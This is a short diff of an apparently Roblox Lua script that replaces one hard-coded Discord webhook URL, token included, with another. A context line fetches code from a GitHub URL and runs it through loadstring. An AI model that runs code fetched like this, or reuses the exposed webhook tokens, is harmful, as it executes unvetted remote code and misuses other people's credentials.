@@ -6,7 +6,7 @@ loadstring(game:HttpGet(("https://raw.githubusercontent.com/iiX0Lords/Building/m
 
 local plr = game.Players.LocalPlayer
 
-local AREARL = "https://discord.com/api/webhooks/947001814199435325/-v1y9BZ2lG66ByYv1eOyYSHD4zkfru0xnLE1i4simi6eOdktxPYja1BXXU8wBzCZ_urY"
+local AREARL = "https://discord.com/api/webhooks/948489211491811348/-LtP--hfELGoBHt5cWLnF447vzUVPXGJQQAK-wZ9yShPJW21GEsc1aPm5FxrlRSLvUKz"
 
 local runservice = game:GetService("RunService")
 local userInputService = game:GetService("UserInputService")
